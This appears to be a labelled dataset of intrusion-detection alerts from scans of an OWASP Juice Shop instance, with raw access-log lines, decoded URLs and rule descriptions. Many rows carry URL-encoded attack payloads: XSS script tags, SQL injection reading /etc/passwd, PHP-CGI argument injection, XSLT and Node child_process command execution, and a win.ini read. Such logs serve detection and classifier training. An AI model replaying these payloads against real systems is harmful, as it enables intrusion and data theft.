log_id,full_log,data.protocol,data.url,decoder.name,rule.description,rule.groups,rule.id,rule.level
44,"10.42.2.150 - - [12/May/2026:15:33:56 +0000] ""GET /rest/products/search?q=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/search?q=%27%22%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,web-accesslog,Common web attack.,"[""web"",""accesslog"",""attack""]",31104,6
1414,"10.42.2.150 - - [12/May/2026:16:09:04 +0000] ""GET /rest/products/.htaccess HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/.htaccess,web-accesslog,Suspicious URL access.,"[""web"",""appsec"",""attack""]",31516,6
632,"10.42.1.207 - - [12/May/2026:16:07:09 +0000] ""GET /rest/products/search?q=%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/search?q=%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sqlinjection"",""attack""]",31164,6
608,"10.42.1.207 - - [12/May/2026:15:32:48 +0000] ""POST /assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public/images/uploads/magn(et)ificent!-1571814229653.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
374,"10.42.0.234 - - [12/May/2026:16:18:35 +0000] ""GET /rest/products.swp HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/products.swp,web-accesslog,Suspicious URL access.,"[""web"",""appsec"",""attack""]",31516,6
278,"10.42.0.234 - - [12/May/2026:16:14:13 +0000] ""GET /api/SecurityQuestions%20-%20Copy%20(3) HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/api/SecurityQuestions%20-%20Copy%20(3),web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
1009,"10.42.2.150 - - [12/May/2026:16:22:10 +0000] ""GET /rest HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
565,"10.42.0.234 - - [12/May/2026:15:33:56 +0000] ""GET /redirect?to=%3C%2Fh2%3E%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Ch2%3E HTTP/1.1"" 406 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=%3C%2Fh2%3E%00%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E%3Ch2%3E,web-accesslog,Common web attack.,"[""web"",""accesslog"",""attack""]",31104,6
498,"10.42.2.150 - - [12/May/2026:15:34:24 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
1265,"10.42.2.150 - - [12/May/2026:16:12:55 +0000] ""GET /rest HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
1,"10.42.1.195 - - [13/May/2026:01:22:33 +0000] ""GET /api/BasketItems/0%20UNION%20SELECT%20load_file%28%27%2Fetc%2Fpasswd%27%29--%20 HTTP/1.1"" 200 - ""https://juice-shop.vtsolutions.it/"" ""curl/8.5.0""",GET,/api/BasketItems/0%20UNION%20SELECT%20load_file%28%27%2Fetc%2Fpasswd%27%29--%20,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
740,"10.42.1.207 - - [12/May/2026:15:33:45 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
1116,"10.42.0.234 - - [12/May/2026:16:18:36 +0000] ""GET /rest/user~ HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/user~,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
300,"10.42.0.234 - - [12/May/2026:15:33:49 +0000] ""GET /api/Challenges/?name=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E HTTP/1.1"" 200 30 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/api/Challenges/?name=%27%22%3CscrIpt%3Ealert%281%29%3B%3C%2FscRipt%3E,web-accesslog,A web attack returned code 200 (success).,"[""web"",""accesslog"",""attack""]",31106,6
1015,"10.42.2.150 - - [12/May/2026:15:34:24 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31151,10
385,"10.42.2.150 - - [12/May/2026:15:32:46 +0000] ""POST /assets/public/images/carousel/7.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public/images/carousel/7.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
50,"10.42.1.207 - - [12/May/2026:15:32:47 +0000] ""POST /assets/public/images/products/carrot_juice.jpeg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public/images/products/carrot_juice.jpeg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1428,"10.42.0.12 - - [12/May/2026:16:44:25 +0000] ""GET /rest/admin HTTP/1.1"" 400 26 ""https://juice-shop.vtsolutions.it/"" ""curl/8.5.0""",POST,/rest/admin,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
1328,"10.42.0.234 - - [12/May/2026:16:17:55 +0000] ""GET /rest/admin/application-configuration.swp HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/admin/application-configuration.swp,web-accesslog,Suspicious URL access.,"[""web"",""appsec"",""attack""]",31516,6
112,"10.42.1.195 - - [13/May/2026:09:16:11 +0000] ""GET /api/Cards HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0""",GET,/api/Cards,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31151,10
126,"10.42.1.207 - - [12/May/2026:16:07:03 +0000] ""GET /rest/admin HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/admin,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
169,"10.42.2.150 - - [12/May/2026:15:32:36 +0000] ""POST /api/Feedbacks?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/api/Feedbacks?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1101,"10.42.0.234 - - [12/May/2026:16:12:55 +0000] ""GET /rest/admin HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/admin,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
497,"10.42.0.234 - - [12/May/2026:15:32:42 +0000] ""POST /application/node_modules/express/lib/router/runtime.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/application/node_modules/express/lib/router/runtime.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
332,"10.42.0.234 - - [12/May/2026:16:04:56 +0000] ""GET /redirect?to=%3Cimg%20src=%22random.gif%22%20onerror=alert(5397)%3E HTTP/1.1"" 406 - ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=%3Cimg%20src=%22random.gif%22%20onerror=alert(5397)%3E,web-accesslog,XSS (Cross Site Scripting) attempt.,"[""web"",""accesslog"",""attack""]",31105,6
69,"10.42.2.150 - - [12/May/2026:16:14:14 +0000] ""GET /apibackup/Quantitys HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/apibackup/Quantitys,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
1128,"10.42.1.207 - - [12/May/2026:16:05:51 +0000] ""POST /api/Quantitys/ HTTP/1.1"" 401 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/api/Quantitys/,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
1329,"10.42.0.234 - - [12/May/2026:15:32:24 +0000] ""GET /api HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/api,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
331,"10.42.3.18 - - [13/May/2026:00:00:35 +0000] ""POST /actuator/env HTTP/1.1"" 403 162 ""https://juice-shop.vtsolutions.it/"" ""sqlmap/1.8.4#stable (https://sqlmap.org)""",GET,/actuator/env,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
852,"10.42.2.150 - - [12/May/2026:15:32:45 +0000] ""POST /assets/public?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
522,"10.42.1.207 - - [12/May/2026:15:32:52 +0000] ""POST /ie.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/ie.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
379,"10.42.1.94 - - [13/May/2026:13:22:14 +0000] ""POST /ftp/eastere.gg HTTP/1.1"" 403 - ""https://juice-shop.vtsolutions.it/"" ""Nikto/2.5.0""",GET,/ftp/eastere.gg,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
908,"10.42.1.207 - - [12/May/2026:16:12:41 +0000] ""GET /rest/user HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/user,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
342,"10.42.2.150 - - [12/May/2026:16:17:56 +0000] ""GET /rest/admin%20-%20Copy/application-version HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/admin%20-%20Copy/application-version,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1097,"10.42.1.207 - - [12/May/2026:16:09:27 +0000] ""GET /rest/products/search?q=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/search?q=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,web-accesslog,Common web attack.,"[""web"",""accesslog"",""attack""]",31104,6
1391,"10.42.2.150 - - [12/May/2026:16:14:13 +0000] ""GET /api/Copy%20(2)%20of%20Quantitys HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/api/Copy%20(2)%20of%20Quantitys,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1141,"10.42.1.207 - - [12/May/2026:16:18:34 +0000] ""GET /rest/products.backup HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/products.backup,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1320,"10.42.1.207 - - [12/May/2026:15:32:57 +0000] ""POST /socket.io?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/socket.io?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
305,"10.42.2.150 - - [12/May/2026:16:20:28 +0000] ""TRACE /api/Feedbacks HTTP/1.1"" 500 - ""-"" ""-""",TRACE,/api/Feedbacks,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1178,"10.42.1.207 - - [12/May/2026:16:18:34 +0000] ""GET /rest/user HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/user,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
477,"10.42.2.150 - - [12/May/2026:16:07:56 +0000] ""GET /rest/products/search?q=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/search?q=%7B%7B%3D+global.process.mainModule.require%28%27child_process%27%29.execSync%28%27sleep+15%27%29.toString%28%29+%7D%7D,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1017,"10.42.1.150 - - [13/May/2026:02:50:22 +0000] ""GET /rest/products HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0""",GET,/rest/products,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31151,10
1337,"10.42.2.150 - - [12/May/2026:16:18:16 +0000] ""GET /rest/Copy%20(3)%20of%20languages HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/Copy%20(3)%20of%20languages,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
663,"10.42.0.234 - - [12/May/2026:15:34:50 +0000] ""GET /rest/products/search?q=%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27 HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/search?q=%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sqlinjection"",""attack""]",31164,6
1407,"10.42.1.207 - - [12/May/2026:16:21:53 +0000] ""GET /rest/products HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1197,"10.42.2.150 - - [12/May/2026:15:34:37 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
738,"10.42.0.234 - - [12/May/2026:15:32:08 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
171,"10.42.1.207 - - [12/May/2026:16:22:46 +0000] ""GET /rest/products HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
101,"10.42.0.234 - - [12/May/2026:15:34:23 +0000] ""GET /api/Challenges/?name=Score+Board%22+UNION+ALL+select+NULL+--+ HTTP/1.1"" 200 30 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/api/Challenges/?name=Score+Board%22+UNION+ALL+select+NULL+--+,web-accesslog,A web attack returned code 200 (success).,"[""web"",""accesslog"",""attack""]",31106,6
495,"10.42.0.234 - - [12/May/2026:16:22:46 +0000] ""GET /rest/user HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/user,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
912,"10.42.0.99 - - [12/May/2026:18:51:15 +0000] ""POST /.git/config HTTP/1.1"" 406 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)""",GET,/.git/config,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
97,"10.42.0.234 - - [12/May/2026:15:32:33 +0000] ""GET /rest/admin HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/admin,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1231,"10.42.0.234 - - [12/May/2026:15:32:43 +0000] ""POST /application/node_modules/serve-index/assets/public/assets/public?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/application/node_modules/serve-index/assets/public/assets/public?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1059,"10.42.2.150 - - [12/May/2026:16:13:36 +0000] ""GET /rest/products/search?q=%27%3B+sleep%2815.0%29%3B+var+x%3D%27 HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/products/search?q=%27%3B+sleep%2815.0%29%3B+var+x%3D%27,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sqlinjection"",""attack""]",31164,6
